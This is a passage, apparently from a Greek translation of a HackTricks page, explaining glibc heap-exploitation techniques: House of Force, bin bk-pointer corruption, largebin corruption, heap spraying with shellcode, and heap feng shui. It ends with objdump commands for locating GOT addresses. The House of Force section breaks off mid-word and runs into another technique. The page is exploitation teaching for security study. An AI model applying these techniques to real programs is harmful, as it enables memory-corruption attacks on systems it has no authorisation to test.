Αν για παράδειγμα το πρόγραμμα ρωτάει τον χρήστη για έναν αριθμό, θα μπορούσαμε να εισάγουμε το 48 και να κατευθύνουμε τον τροποποιήσιμο δείκτη του malloc στα επόμενα 4bytes (που θα μπορούσαν να ανήκουν στο EBP με τύχη, έτσι το 48 μένει πίσω, σαν να ήταν η κεφαλίδα size). Επιπλέον, η διεύθυνση ptr-4+48 πρέπει να πληροί αρκετές προϋποθέσεις (σε αυτήν την περίπτωση ptr=EBP), δηλαδή, 8 < ptr-4+48 < av->system\_mem.

Σε περίπτωση που αυτό ισχύει, όταν κληθεί το επόμενο malloc που είπαμε ότι είναι το malloc(40), θα του ανατεθεί ως διεύθυνση η διεύθυνση του EBP. Σε περίπτωση που ο επιτιθέμενος μπορεί επίσης να ελέγχει τι γράφεται σε αυτό το malloc μπορεί να αντικαταστήσει τόσο το EBP όσο και το EIP με τη διεύθυνση που θέλει.

Αυτό πιστεύω ότι είναι επειδή έτσι όταν απελευθερωθεί το free() θα αποθηκεύσει ότι στη διεύθυνση που δείχνει στο EBP της στοίβας υπάρχει ένα κομμάτι με τέλειο μέγεθος για το νέο malloc() που θέλει να κρατήσει, έτσι του αναθέτει αυτή τη διεύθυνση.

**The House of Force**

Απαιτείται:

* Ένα overflow σε ένα κομμάτι που επιτρέπει την αντικατάσταση του wilderness
* Μια κλήση στο malloc() με το μέγεθος που ορίζεται από τον χρήστη
* Μια κλήση στο malloc() των δεδομένων της οποίας μπορούν να οριστούν από τον χρήστη

Το πρώτο πράγμα που γίνεται είναι η αντικατάσταση του μεγέθους του κομματιού wilderness με ένα πολύ μεγάλο αριθμό (0xffffffff), έτ
Απαιτούνται δύο δεσμεύσεις malloc, ώστε το πρώτο να μπορεί να υποστεί overflow μετά την απελευθέρωση του δεύτερου και να έχει εισαχθεί στον bin του (δηλαδή να έχει δεσμευτεί ένα malloc μεγαλύτερο από το δεύτερο πριν το overflow).

Το malloc που δεσμεύεται στη διεύθυνση που επιλέγει ο επιτιθέμενος πρέπει να ελέγχεται από τον επιτιθέμενο.

Ο στόχος είναι, αν μπορούμε να προκαλέσουμε ένα overflow σε ένα heap που έχει ήδη ένα τμήμα που έχει απελευθερωθεί και βρίσκεται στον bin του, μπορούμε να τροποποιήσουμε τον δείκτη bk του. Αν τροποποιήσουμε τον δείκτη bk και αυτό το τμήμα γίνει το πρώτο στη λίστα του bin και δεσμευτεί, το bin θα παραπλανηθεί και θα του λεχθεί ότι το επόμενο τμήμα στη λίστα (το επόμενο που προσφέρεται) βρίσκεται στην ψευδή διεύθυνση που έχουμε ορίσει (π.χ. στο stack ή στο GOT). Έτσι, αν δεσμευτεί ξανά ένα τμήμα και ο επιτιθέμενος έχει δικαιώματα σε αυτό, θα λάβει ένα τμήμα στην επιθυμητή θέση και θα μπορεί να γράψει σε αυτό.

Μετά την απελευθέρωση του τροποποιημένου τμήματος, είναι απαραίτητο να δεσμευτεί ένα τμήμα μεγαλύτερο από το απελευθερωμένο, έτσι το τροποποιημένο τμήμα θα βγει από τα unsorted bins και θα εισαχθεί στον bin του.

Όταν βρίσκεται στον bin του, είναι η στιγμή να τροποποιηθεί ο δείκτης bk μέσω του overflow ώστε να δείχνει στη διεύθυνση που θέλουμε να αντικαταστήσουμε.

Έτσι, ο bin θα πρέπει να περιμένει να κληθεί η malloc() αρκετές φορές ώστε να χρησιμοποιηθεί ξανά το τροποποιημένο bin και να παραπλανηθεί ο bin πιστεύοντας ότι το επόμενο τμήμα βρίσκεται στην ψευδή διεύθυνση. Και στη συνέχεια θα δοθεί το επιθυμητό τμήμα.

Για να εκτελεστεί η ευπάθεια το συντομότερο δυνατόν, ιδανικά θα έπρεπε: Κράτηση του ευπαθούς τμήματος, κράτηση του τμήματος που θα τροποποιηθεί, απελευθέρωση αυτού του τμήματος, δέσμευση ενός τμήματος μεγαλύτερου από αυτό που θα τροποποιηθεί, τροποποίηση του τμήματος (ευπαθεία), δέσμευση ενός τμήματος με τον ίδιο μέγεθος με το ευπαθές και δέσμευση ενός δεύτερου τμήματος με τον ίδιο μέγεθος και αυτό θα είναι αυτό που θα δείχνει στη διεύθυνση που επιλέγεται.

Για να προστατευτεί αυτή η επίθεση, χρησιμοποιείται ο τυπικός έλεγχος ότι το τμήμα "δεν" είναι ψευδές: ελέγχεται αν το bck->fd δείχνει στο victim. Δηλαδή, στην περίπτωσή μας, αν ο δείκτης fd* του ψεύτικου τμήματος που δείχνει στο stack δείχνει στο victim. Για να παρακάμψει αυτήν την προστασία, ο επιτιθέμενος θα πρέπει να είναι σε θέση να γράψει κάπως (πιθανότατα μέσω του stack) στη σωστή διεύθυνση τη διεύθυνση του victim. Έτσι, θα φαίνεται ότι είναι ένα αληθινό τμήμα.

**Διαφθορά LargeBin**

Απαιτούνται τα ίδια προαπαιτούμενα με πριν και κάποια παραπάνω, επιπλέον τα δεσμευμένα τμήματα πρέπει να είναι μεγαλύτερα από 512.

Η επίθεση είναι όπως πριν, δηλαδή πρέπει να τροποποιηθεί ο δείκτης bk και να χρειάζονται όλες αυτές οι κλήσεις στην malloc(), αλλά πρέπει επίσης να τροποποιηθεί το μέγεθος του τροποποιημένου τμήματος έτσι ώστε αυτό το μέγεθος - nb να είναι < MINSIZE.

Για παράδειγμα, θα πρέπει να οριστεί το μέγεθος σε 1552 ώστε 1552 - 1544 = 8 < MINSIZE (η αφαίρεση δεν μπορεί να είναι αρνητική επειδή συγκρίνεται με έναν ανυπογραφόμενο αριθμό)

Επιπλέον, έχει εισαχθεί ένα patch για να γίνει ακόμη πιο περίπλοκο.

**Στρόβιλος Heap**

Βασικά αποτελείται από τη δέσμευση της μέγιστης δυνατής μνήμης για heaps και την επικάλυψή τους με ένα στρώμα nops που τελειώνει με μια shellcode. Επιπλέον, ως στρώμα χρησιμοποιείται το 0x0c. Έτσι, θα προσπαθήσει να μεταβεί στη διεύθυνση 0x0c0c0c0c, και έτσι αν κάποια διεύθυνση που θα χρησιμοποιηθεί με αυτό το στρώμα υπεργραφεί, θα μεταβεί εκεί. Βασικά η τακτική είναι να δεσμεύσετε το μέγιστο δυνατό για να δείτε αν υπεργράφεται κάποιος δείκτης και να μεταβείτε στο 0x0c0c0c0c ελπίζοντας ότι εκεί θα υπάρχουν nops.

**Σχεδιασμός Heap Feng**

Αποτελείται από την ενσωμάτωση και απελευθέρωση μνήμης με τρόπο ώστε να υπάρχουν δεσμευμένα τμήματα μεταξύ ελεύθερων τμημάτων. Το buffer που θα υπερχειλιστεί θα βρίσκεται σε ένα από αυτά.

**objdump -d εκτελέσιμο** —> Διασυναρμολόγηση συναρτήσεων\
**objdump -d ./ΠΡΟΓΡΑΜΜΑ | grep ΣΥΝΑΡΤΗΣΗ** —> Λήψη διεύθυνσης συνάρτησης\
**objdump -d -Mintel ./shellcodeout** —> Για να δούμε αν πράγματι είναι η shellcode μας και να εξάγουμε τα OpCodes\
**objdump -t ./exec | grep varBss** —> Πίνακας συμβόλων, για να εξάγουμε τη διεύθυνση μεταβλητών και συναρτήσεων\
**objdump -TR ./exec | grep exit(func lib)** —> Για να εξάγουμε τη διεύθυνση συναρτήσεων βιβλιοθηκών (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> Εξάγει τη διεύθυνση του puts που θα υπεργραφεί στο GOT\
**objdump -D ./exec** —> Διασυναρμολόγηση ΟΛΩΝ μέχρι τις εισόδους της plt\
**objdump -p -/exec**\
**Πληροφορίες συναρτήσεων strncmp —>** Πληροφορίες για τη συνάρτηση στο gdb

## Ενδιαφέροντα μαθήματα

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Αναφορές**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελ
